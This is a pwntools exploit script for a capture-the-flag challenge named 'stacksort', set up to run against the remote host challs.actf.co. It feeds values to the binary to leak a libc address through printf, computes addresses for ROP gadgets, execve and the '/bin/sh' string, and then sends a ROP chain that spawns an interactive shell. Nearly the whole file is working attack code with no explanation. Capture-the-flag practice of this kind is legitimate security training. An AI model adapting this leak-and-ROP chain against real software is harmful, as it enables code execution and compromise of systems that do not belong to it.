from pwn import *

exe = './stacksort_patched'

(host,port_num) = ("challs.actf.co",31500)

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug(
            [exe] + argv, gdbscript=gscpt, *a, **kw)
    elif args.RE:
        return remote(host,port_num)
    else:
        return process( 
            [exe] + argv, *a, **kw)
    
gscpt = (
    '''
b * 0x00000000004012e8
'''
).format(**locals())

context.update(arch='amd64')

# SHORTHANDS FOR FNCS
se  = lambda nbytes     : p.send(nbytes)
sl  = lambda nbytes     : p.sendline(nbytes)
sa  = lambda msg,nbytes : p.sendafter(msg,nbytes)
sla = lambda msg,nbytes : p.sendlineafter(msg,nbytes)
rv  = lambda nbytes     : p.recv(nbytes,timeout=10)
rvu = lambda msg        : p.recvuntil(msg,timeout=10)
rvl = lambda            : p.recvline()

# SIMPLE PRETTY PRINTER
def w(*args):
    print(f"〔\033[1;32m>\033[0m〕",end="")
    for i in args:
        print(hex(i)) if(type(i) == int) else print(i,end=" ")
    print("")

# PWNTOOLS CONTEXT
context.log_level = \
    'DEBUG'

# _____________________________________________________ #
# <<<<<<<<<<<<<<< EXPLOIT STARTS HERE >>>>>>>>>>>>>>>>> #

p = start()

ret = 0x000000000040101a
printf = 0x00000000004010a0

for i in range (254):
    rvu(f":".encode())
    sl(f"{ret}".encode())

rvu(f":".encode())
sl(f"{0xdeadbeef}".encode())

rvu(b": ")
sl(f"{printf}".encode())

libc = u64(rv(6).ljust(8,b"\x00")) - 0x21b150
w(libc)

poprdi     = libc + 0x000000000002a3e5
xorecx     = libc + 0x00000000000416d8
poprbp     = libc + 0x0000000000044d45
rbpcons    = libc + 0x0000000000044d4d
xchgebp    = libc + 0x0000000000048c2d
one_gadget = libc + 0x0000000000050a47
binsh      = libc + 0x00000000001d8678

padding    = libc + 0x0000000000029e40
rett       = libc + 0x0000000000029f4b

system     = libc + 0x0000000000050d70

poprcxret  = libc + 0x000000000003d1ee
gets       = libc + 0x0000000000080520
movrdir12callrcx = libc + 0x000000000162da3

poprdx   = libc + 0x000000000011f2e7
poprsi   = libc + 0x000000000002be51
execve   = libc + 0x00000000000eb080
stackchk = libc + 0x0000000000136550

# set rdx = null poprbp,r12,r13 call rax
callgadget = libc + 0x0000000000081359
poprax     = libc + 0x0000000000045eb0
moveaxesi  = libc + 0x000000000005a0b9

poprdicall = libc + 0x0000000000125a01

for i in range (251):
    rvu(f"{i}:".encode())
    se(f"{rett}".encode())

rvu(b": ")
se(f"{rett}".encode())

rvu(b": ")
se(f"{poprax}".encode())

rvu(b": ")
se(f"{execve}".encode())

rvu(b": ")
se(f"{poprdicall}".encode())

rvu(b": ")
se(f"{binsh}".encode())

p.interactive()